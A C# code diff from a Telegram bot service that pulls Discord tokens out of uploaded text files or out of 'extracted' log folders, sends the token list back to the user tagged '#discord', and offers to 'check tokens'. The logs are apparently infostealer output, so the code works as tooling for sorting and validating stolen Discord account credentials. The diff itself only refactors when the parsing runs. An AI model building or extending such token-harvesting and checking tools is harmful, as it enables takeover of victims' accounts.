@@ -77,35 +77,42 @@ namespace Bot.Telegram.Commands.User.Services {
 			string name = "";
 			int? message_id = null;
             
-			logger.LogInformation("[Discord] Parsing tokens");
 			switch (args) {
 				case UpdateNewMessage {message: Message {media: MessageMediaDocument {document: Document {mime_type: "text/plain"} document}}}:
 					name = document.Filename.Split('.')[0];
-				
-					using (var memory = new MemoryStream()) {
-
-						await client.DownloadFileAsync(document, memory);
-
-						memory.Seek(0, SeekOrigin.Begin);
-
-						using (var reader = new StreamReader(memory)) {
-							tokens = (await reader.ReadToEndAsync()).Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToList();
-						}
-					}
 					break;
 				case UpdateBotCallbackQuery { data: var data, msg_id: var msg_id }:
 					message_id = msg_id;
 					
-					(name, var path) = config.GetPath(data, Paths.Extracted);
-
-					tokens = parser.FromLogs(path, int.Parse(config["Multithreading:Parser"])).Select(x => x.Token).Distinct().ToList();
+					(name, _) = config.GetPath(data, Paths.Extracted);
 					break;
 			}
 			
-			logger.LogInformation("[Discord] Parsing completed");
 
 			var (system, telegram) = await files.CreateOrGetAsync(
 				async stream => {
+					logger.LogInformation("[Discord] Parsing tokens");
+					
+					switch (args) {
+						case UpdateNewMessage {message: Message {media: MessageMediaDocument {document: Document {mime_type: "text/plain"} document}}}:
+							using (var memory = new MemoryStream()) {
+
+								await client.DownloadFileAsync(document, memory);
+
+								memory.Seek(0, SeekOrigin.Begin);
+
+								using (var reader = new StreamReader(memory)) {
+									tokens = (await reader.ReadToEndAsync()).Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToList();
+								}
+							}
+							break;
+						case UpdateBotCallbackQuery { data: var data }:
+							tokens = parser.FromLogs(config.GetPath(data, Paths.Extracted).path, int.Parse(config["Multithreading:Parser"])).Select(x => x.Token).ToList();
+							break;
+					}
+					
+					logger.LogInformation("[Discord] Parsing completed");
+					
 					await using (var writer = new StreamWriter(stream, leaveOpen: true)) {
 						foreach (var token in tokens) {
 							await writer.WriteLineAsync(token);
@@ -117,17 +124,16 @@ namespace Bot.Telegram.Commands.User.Services {
 			);
 
 			var text = "#discord";
-			var entities = client.MarkdownToEntities(ref text);
 			
 			await client.Messages_SendMedia(
 				user,
 				telegram,
 				text,
 				Random.Shared.NextInt64(),
-				entities: entities
+				entities: client.MarkdownToEntities(ref text)
 			);
 			
-			await new ConfirmationCommand(client).ExecuteAsync(user, new(message_id, Keys.Services.DiscordCheckCallback, Keys.StartCallback, "Do you wanna check tokens?", system.Id));
+			await new ConfirmationCommand(client).ExecuteAsync(user, new(message_id, Keys.Services.DiscordCheckCallback, Keys.DisposeCallback, "Do you wanna check tokens?", system.Id));
 		}
 	}
 }
